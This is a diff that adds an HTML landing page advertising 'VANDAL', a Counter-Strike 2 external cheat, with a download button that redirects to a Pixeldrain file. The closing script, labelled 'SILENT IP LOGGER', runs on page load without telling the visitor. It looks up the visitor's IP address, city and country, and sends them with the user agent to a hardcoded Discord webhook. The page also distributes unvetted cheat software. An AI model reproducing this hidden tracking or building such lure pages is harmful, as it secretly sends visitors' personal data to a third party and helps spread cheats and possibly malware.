@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>VANDAL PERFORMANCE EXTERNAL</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com">
+    </script>
+    <!-- JetBrains Mono Font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500;800&display=swap" rel="stylesheet" />
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        blindWhite: 'rgba(255, 255, 250, 0.95)',
+                        dustNoise: '#EAE6D8',
+                        afterImageNavy: '#12141C',
+                        borderNavy: '#222635'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Flashbang Retinal Burn Animation */
+        @keyframes flashOut {
+            0% {
+                background-color: rgba(255, 255, 250, 1);
+                opacity: 1;
+                visibility: visible;
+            }
+            15% {
+                background-color: rgba(255, 255, 250, 0.95);
+            }
+            40% {
+                background-color: #EAE6D8;
+            }
+            100% {
+                background-color: transparent;
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+        .flashbang-overlay {
+            animation: flashOut 2.2s cubic-bezier(0.1, 0.8, 0.2, 1) forwards;
+        }
+
+        /* Broken Gas Station Light / Faulty Neon Sign Glow Effect */
+        @keyframes brokenGasStationLight {
+            0%,
+            18%,
+            22%,
+            25%,
+            53%,
+            57%,
+            100% {
+                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8),
+                    0 0 20px rgba(255, 255, 255, 0.6),
+                    0 0 30px rgba(255, 255, 255, 0.4);
+                opacity: 1;
+            }
+            19%,
+            24%,
+            55% {
+                text-shadow: none;
+                opacity: 0.15;
+            }
+            20% {
+                text-shadow: 0 0 5px rgba(255, 255, 255, 0.4);
+                opacity: 0.4;
+            }
+            21% {
+                text-shadow: none;
+                opacity: 0.1;
+            }
+            54% {
+                text-shadow: 0 0 8px rgba(255, 255, 255, 0.5);
+                opacity: 0.6;
+            }
+            56% {
+                text-shadow: none;
+                opacity: 0.2;
+            }
+            78%,
+            82% {
+                text-shadow: 0 0 2px rgba(255, 255, 255, 0.2);
+                opacity: 0.3;
+            }
+            80% {
+                text-shadow: 0 0 40px rgba(255, 255, 255, 0.9),
+                    0 0 80px rgba(255, 255, 255, 0.7);
+                opacity: 1;
+            }
+        }
+
+        .gas-station-glow {
+            animation: brokenGasStationLight 3.5s linear infinite;
+        }
+
+        /* Smooth subtle entry fade animation */
+        @keyframes subtleSlideUp {
+            0% {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .animate-slideup {
+            animation: subtleSlideUp 1.2s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #141517;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2b2d31;
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #eae6d8;
+        }
+
+        /* Tab buttons */
+        .tab-btn {
+            background: transparent;
+            border: 2px solid #2b2d31;
+            color: #EAE6D8;
+            padding: 0.8rem 2rem;
+            font-size: 0.9rem;
+            font-weight: 800;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border-radius: 0;
+            flex: 1;
+            text-align: center;
+        }
+        .tab-btn.active {
+            border-color: #FFFFFA;
+            color: #FFFFFA;
+            background: rgba(255, 255, 250, 0.05);
+        }
+        .tab-btn:hover:not(.active) {
+            border-color: #666;
+        }
+
+        .panel {
+            display: none;
+            animation: subtleSlideUp 0.6s ease forwards;
+        }
+        .panel.active {
+            display: block;
+        }
+
+        /* Image placeholder – single image for vandal.png */
+        .img-placeholder {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            aspect-ratio: 16 / 9;
+            background: linear-gradient(145deg, #1c1d21, #2b2d31);
+            border: 1px solid #3a3c44;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6a6c74;
+            font-size: 0.9rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+            font-weight: 800;
+        }
+        .img-placeholder::after {
+            content: "vandal.png";
+            opacity: 0.4;
+        }
+        .img-placeholder::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255, 255, 255, 0.02) 10px, rgba(255, 255, 255, 0.02) 20px);
+            pointer-events: none;
+        }
+
+        /* Coming soon large text */
+        .coming-soon {
+            font-size: 2.5rem;
+            font-weight: 800;
+            letter-spacing: 8px;
+            color: #666;
+            text-transform: uppercase;
+            padding: 2rem 0;
+            border: 2px dashed #3a3c44;
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        /* Download button */
+        .download-link {
+            display: inline-block;
+            background: #FFFFFA;
+            color: #12141C;
+            font-weight: 800;
+            padding: 1rem 2rem;
+            font-size: 0.875rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            text-decoration: none;
+            transition: all 0.2s ease;
+            border: 2px solid #FFFFFA;
+            box-shadow: 0 0 30px rgba(255, 255, 250, 0.1);
+            cursor: pointer;
+            border-radius: 0;
+            font-family: inherit;
+            width: auto;
+        }
+        .download-link:hover {
+            background: white;
+            transform: scale(1.02);
+        }
+        .download-link:active {
+            transform: scale(0.98);
+        }
+        .download-link:disabled {
+            opacity: 0.5;
+            cursor: wait;
+            transform: none;
+        }
+    </style>
+</head>
+<body class="bg-[#141517] text-[#EAE6D8] font-mono overflow-x-hidden min-h-screen flex flex-col justify-between">
+
+    <!-- RETINAL BURN OVERLAY -->
+    <div class="fixed inset-0 z-50 pointer-events-none flashbang-overlay"></div>
+
+    <!-- CUSTOM POPUP MODAL -->
+    <div id="downloadModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm hidden transition-opacity duration-300 opacity-0">
+        <div class="bg-[#1c1d21] border border-white p-8 max-w-md w-full text-center shadow-[0_0_50px_rgba(255,255,255,0.15)] rounded-sm">
+            <div id="modalTitle" class="text-white text-3xl font-extrabold mb-4 tracking-widest uppercase">REDIRECTING</div>
+            <p id="modalMessage" class="text-xs text-[#EAE6D8]/80 leading-relaxed mb-6">
+                Opening download page in a new tab …
+            </p>
+            <button onclick="closeModal()" class="w-full bg-[#FFFFFA] text-[#12141C] font-bold py-3 text-xs tracking-widest hover:bg-[#EAE6D8] transition-colors uppercase">
+                RETURN
+            </button>
+        </div>
+    </div>
+
+    <!-- MAIN -->
+    <main class="max-w-4xl mx-auto px-4 py-24 flex flex-col items-center justify-center text-center flex-grow w-full">
+
+        <!-- ASCII ART -->
+        <div class="p-0 border-none bg-transparent rounded-none mb-6 max-w-full overflow-x-auto select-none">
+            <pre class="text-[0.55rem] sm:text-xs md:text-sm font-bold text-white tracking-tighter leading-none gas-station-glow">
+                _    __ ___     _   __ ____   ___     __
+                | |  / //   |   / | / // __ \ /   |   / /
+                | | / // /| |  /  |/ // / / // /| |  / /
+                | |/ // ___ | / /|  // /_/ // ___ | / /___
+                |___//_/  |_|/_/ |_//_____//_/  |_|/_____/
+            </pre>
+        </div>
+
+        <p class="text-sm md:text-base tracking-widest max-w-xl text-[#FFFFFA] font-extrabold mb-8 uppercase leading-relaxed animate-slideup">
+            LIGHTEST CS2 EXTERNAL ON THE MARKET ZERO LAG ZERO SETUP WORKS ON ANY PC
+        </p>
+
+        <!-- TABS: FAST / ULTIMATE -->
+        <div class="flex w-full max-w-md border border-[#2b2d31] divide-x divide-[#2b2d31] mb-10 animate-slideup" style="animation-delay: 0.1s;">
+            <button id="tabFast" class="tab-btn active" onclick="switchTab('fast')">FAST</button>
+            <button id="tabUltimate" class="tab-btn" onclick="switchTab('ultimate')">ULTIMATE</button>
+        </div>
+
+        <!-- PANELS -->
+        <div class="w-full max-w-3xl animate-slideup" style="animation-delay: 0.2s;">
+            <!-- FAST PANEL -->
+            <div id="panel-fast" class="panel active">
+                <h2 class="text-2xl font-extrabold text-white uppercase tracking-widest mb-4">FAST CHEAT</h2>
+                <p class="text-xs text-[#EAE6D8]/70 leading-relaxed max-w-xl mx-auto mb-8">
+                    Minimal injection, rapid execution, low footprint. Ideal for quick matches.
+                </p>
+                <!-- Single image placeholder for vandal.png -->
+                <div class="img-placeholder mb-8"></div>
+                <!-- DOWNLOAD BUTTON – redirects to Pixeldrain page -->
+                <button id="downloadFastBtn" class="download-link" onclick="downloadFast()">
+                    DOWNLOAD FAST
+                </button>
+            </div>
+
+            <!-- ULTIMATE PANEL -->
+            <div id="panel-ultimate" class="panel">
+                <h2 class="text-2xl font-extrabold text-white uppercase tracking-widest mb-4">ULTIMATE CHEAT</h2>
+                <p class="text-xs text-[#EAE6D8]/70 leading-relaxed max-w-xl mx-auto mb-8">
+                    Advanced features coming soon.
+                </p>
+                <div class="coming-soon">Coming Soon</div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="border-t border-[#2b2d31] p-6 text-[10px] tracking-wider text-[#EAE6D8]/30 text-center flex justify-center items-center">
+        <div>2026 VANDAL</div>
+    </footer>
+
+    <!-- SCRIPTS -->
+    <script>
+        // ============================================================
+        //  TAB SWITCHING
+        // ============================================================
+        function switchTab(tab) {
+            document.getElementById('tabFast').classList.toggle('active', tab === 'fast');
+            document.getElementById('tabUltimate').classList.toggle('active', tab === 'ultimate');
+            document.getElementById('panel-fast').classList.toggle('active', tab === 'fast');
+            document.getElementById('panel-ultimate').classList.toggle('active', tab === 'ultimate');
+        }
+
+        // ============================================================
+        //  MODAL CONTROLS
+        // ============================================================
+        function openModal(title, message) {
+            const modal = document.getElementById('downloadModal');
+            document.getElementById('modalTitle').textContent = title || 'REDIRECTING';
+            document.getElementById('modalMessage').textContent = message || 'Opening download page in a new tab …';
+            modal.classList.remove('hidden');
+            requestAnimationFrame(() => {
+                modal.classList.remove('opacity-0');
+                modal.classList.add('opacity-100');
+            });
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('downloadModal');
+            modal.classList.remove('opacity-100');
+            modal.classList.add('opacity-0');
+            setTimeout(() => {
+                modal.classList.add('hidden');
+            }, 300);
+        }
+
+        // ============================================================
+        //  FAST DOWNLOAD – just redirect to Pixeldrain page
+        // ============================================================
+        const PIXELDRAIN_PAGE_URL = 'https://pixeldrain.com/u/xdJy8PtZ';
+
+        function downloadFast() {
+            const btn = document.getElementById('downloadFastBtn');
+            if (btn.disabled) return;
+
+            btn.disabled = true;
+            btn.textContent = 'REDIRECTING …';
+
+            // Show modal with redirect message
+            openModal('REDIRECTING', 'Opening download page in a new tab …');
+
+            // Open the Pixeldrain page in a new tab after a short delay (so modal shows)
+            setTimeout(() => {
+                window.open(PIXELDRAIN_PAGE_URL, '_blank');
+                // Re-enable button after a few seconds
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btn.textContent = 'DOWNLOAD FAST';
+                }, 3000);
+            }, 400);
+        }
+
+        // ============================================================
+        //  SILENT IP LOGGER (Discord Webhook) – using ipapi.co
+        // ============================================================
+        (function logIP() {
+            const webhookURL = "https://discord.com/api/webhooks/1521096020577222726/L-0tbv7OV_7IdH1T3FDuKGa1AQWnO1ea6ZRD7p1rOarJJxY9UyPu6jD7h3sppINXfTyj";
+
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip || 'unknown';
+                    const country = data.country_name || 'unknown';
+                    const city = data.city || 'unknown';
+                    const ua = navigator.userAgent;
+                    const timestamp = new Date().toISOString();
+
+                    const message =
+                        `**Vandal IP Log**\n\`\`\`\nIP: ${ip}\nCountry: ${country}\nCity: ${city}\nUser-Agent: ${ua}\nTimestamp: ${timestamp}\n\`\`\``;
+
+                    const formData = new URLSearchParams();
+                    formData.append('payload_json', JSON.stringify({ content: message }));
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: formData,
+                        mode: 'no-cors'
+                    }).catch(() => {});
+                })
+                .catch(() => {});
+        })();
+    </script>
+</body>
+</html>
